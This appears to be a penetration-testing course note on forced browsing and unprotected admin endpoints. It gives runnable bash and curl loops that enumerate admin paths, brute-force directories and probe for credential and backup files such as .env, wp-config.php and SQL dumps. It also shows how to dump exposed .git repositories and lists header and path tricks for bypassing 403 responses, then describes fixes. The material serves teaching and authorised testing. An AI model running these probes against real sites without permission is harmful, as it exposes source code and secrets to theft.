---
tags: [vapt, access-control, beginner]
difficulty: beginner
module: "21 - Access Control"
topic: "21.11 Forced Browsing / Unprotected Admin Endpoints"
portswigger_labs: ["Unprotected admin functionality"]
---

# 21.11 — Forced Browsing / Unprotected Admin Endpoints

## What Is Forced Browsing?

```
FORCED BROWSING:
  Navigating directly to URLs that aren't linked in the UI
  
  The app doesn't show the link → "security by obscurity"
  But: the endpoint exists and works → no real protection
  
  EXAMPLES:
  - /admin (not in navigation for regular users)
  - /api/v1/debug (internal endpoint, not documented)
  - /backup.zip (server backup left on web server)
  - /config.php.bak (backup of config file)
  - /internal/reset-all-users (dangerous function, "hidden")
  
  TESTING: Try common paths → see what responds with 200 (not 404/403)
```

---

## Common Admin Paths to Test

```bash
# ADMIN INTERFACES:
ADMIN_PATHS=(
  "/admin"
  "/admin/"
  "/admin/login"
  "/admin/dashboard"
  "/admin/users"
  "/admin/panel"
  "/administrator"
  "/administrator/login"
  "/wp-admin"         # WordPress
  "/wp-admin/admin.php"
  "/phpmyadmin"       # MySQL admin
  "/pma"              # phpMyAdmin
  "/manager"          # Tomcat Manager
  "/manager/html"
  "/jmx-console"      # JBoss
  "/console"          # Weblogic
  "/adminconsole"
  "/admin-console"
  "/management"
  "/cms"
  "/staff"
  "/backoffice"
  "/control"
  "/controlpanel"
)

for path in "${ADMIN_PATHS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${path}")
  echo "$code - $path"
done | grep "^200\|^301\|^302"
```

---

## Finding Hidden Paths

```bash
# METHOD 1: ROBOTS.TXT
curl -s https://target.com/robots.txt
# Disallow: /admin → listed because Google, also tells hackers!
# Disallow: /secret-backup/ → now we know about it!

# METHOD 2: SITEMAP.XML
curl -s https://target.com/sitemap.xml | grep "<loc>"
# Lists all indexed pages → might include admin pages in error!

# METHOD 3: DIRECTORY BRUTE FORCE
# Feroxbuster (fast, recursive):
feroxbuster -u https://target.com \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
  --status-codes 200,204,301,302,307 \
  -x php,asp,aspx,jsp,html,txt,bak,zip

# Gobuster:
gobuster dir -u https://target.com \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt \
  --status-codes 200-299,301

# METHOD 4: JAVASCRIPT SOURCE ANALYSIS
# Download all JS files:
wget -r -l2 -nd -N --include="*.js" https://target.com -P js_files/
# Grep for API endpoints:
grep -rE "['\"](/api|/admin|/internal|/v[0-9])" js_files/

# METHOD 5: WAYBACK MACHINE (historical URLs)
# Check what URLs existed in the past:
curl "http://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey" \
  | grep -v "^$" | sort -u | head -100
# → Old admin paths that might still work!

# METHOD 6: GOOGLE DORKING
# site:target.com inurl:admin
# site:target.com inurl:panel
# site:target.com filetype:bak
# site:target.com filetype:sql

# METHOD 7: RECURSIVE DIRECTORY SEARCH
feroxbuster -u https://target.com/admin \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt \
  --recurse
# Goes deeper inside found directories!
```

---

## Sensitive Files to Look For

```bash
# BACKUP AND CONFIG FILES:
SENSITIVE_FILES=(
  "/.env"              # Environment variables (passwords!)
  "/.git/config"       # Git repository config
  "/.git/HEAD"         # Git HEAD reference (if .git exposed = source code!)
  "/config.php"
  "/configuration.php"
  "/config.php.bak"
  "/config.php.old"
  "/wp-config.php"     # WordPress config
  "/database.yml"      # Rails database config
  "/settings.py"       # Django settings
  "/app.config"
  "/web.config"
  "/backup.zip"
  "/backup.tar.gz"
  "/db.sql"
  "/dump.sql"
  "/phpinfo.php"       # PHP info (server config details!)
  "/server-status"     # Apache server status
  "/nginx_status"      # Nginx status
  "/.DS_Store"         # Mac metadata (reveals directory structure)
  "/Thumbs.db"         # Windows metadata
  "/CHANGELOG.md"      # App changelog (reveals versions!)
  "/README.md"
  "/composer.json"     # PHP dependencies (app stack info)
  "/package.json"      # Node dependencies
)

for file in "${SENSITIVE_FILES[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com${file}")
  [[ "$code" == "200" ]] && echo "FOUND: https://target.com${file}"
done
```

---

## .git Directory Exposure

```
CRITICAL: IF /.git/ IS ACCESSIBLE
  The ENTIRE SOURCE CODE is downloadable!
  
  TEST:
  curl https://target.com/.git/config
  → Returns git config? → SOURCE CODE EXPOSED!
  
  DOWNLOAD ALL SOURCE CODE:
  git-dumper https://target.com/.git /local/dir
  # pip install git-dumper
  
  WHAT YOU GET:
  - All PHP/Python/Ruby/JS source code
  - Database credentials in config files
  - API keys and secrets
  - Environment variables
  - Git history (deleted files, old passwords!)
  
  SEVERITY: CRITICAL
  → Report as "Source Code Disclosure via .git directory"
```

---

## Testing 403 Bypass

```bash
# ENDPOINT EXISTS BUT RETURNS 403 — TRY TO BYPASS:
TARGET="https://target.com/admin"

# HTTP Method confusion:
curl -X HEAD $TARGET
curl -X OPTIONS $TARGET
curl -X POST $TARGET

# Path variation:
curl "$TARGET/"           # trailing slash
curl "$TARGET/."          # dot
curl "$TARGET/./"         # dot slash
curl "$TARGET//"          # double slash
curl "$TARGET%09"         # tab encoded
curl "$TARGET%20"         # space encoded

# Header-based bypass:
curl -H "X-Original-URL: /admin" https://target.com/
curl -H "X-Rewrite-URL: /admin" https://target.com/
curl -H "X-Custom-IP-Authorization: 127.0.0.1" $TARGET
curl -H "X-Forwarded-For: 127.0.0.1" $TARGET
curl -H "X-Remote-IP: 127.0.0.1" $TARGET
curl -H "Client-IP: 127.0.0.1" $TARGET

# Case variation:
curl "https://target.com/ADMIN"
curl "https://target.com/Admin"
```

---

## Fix

```
NEVER RELY ON OBSCURITY FOR SECURITY:

1. CHECK AUTHENTICATION + AUTHORIZATION ON EVERY ENDPOINT:
   Every admin endpoint → verify:
   a) User is authenticated (logged in)
   b) User has admin role/permission
   
   Don't skip this because "it's not linked in the UI"

2. DENY BY DEFAULT:
   Framework middleware runs on ALL routes
   Default: require authentication
   Explicitly mark public routes as public

3. ROBOTS.TXT STRATEGY:
   Only list in robots.txt what's OK for Google to know
   Don't list secret admin paths (don't advertise them!)
   But: don't confuse robots.txt with security!
   
4. SECURITY HEADERS:
   X-Robots-Tag: noindex (don't index admin pages)
   But: this is SEO, not security!

5. NETWORK-LEVEL CONTROL (where appropriate):
   Admin interfaces on internal network only:
   nginx: allow 10.0.0.0/8; deny all;
   → Can't "forced-browse" admin from internet!
   But: web app access control still needed for internal threat!
```

---

## Related Notes
- [[01 - Vertical Privilege Escalation]] — accessing admin functions
- [[10 - BFLA — Broken Function Level Authorization (OWASP API #5)]] — API function access
- [[20 - Defense — Server-Side Authorization, Object-Level Checks]] — full fix
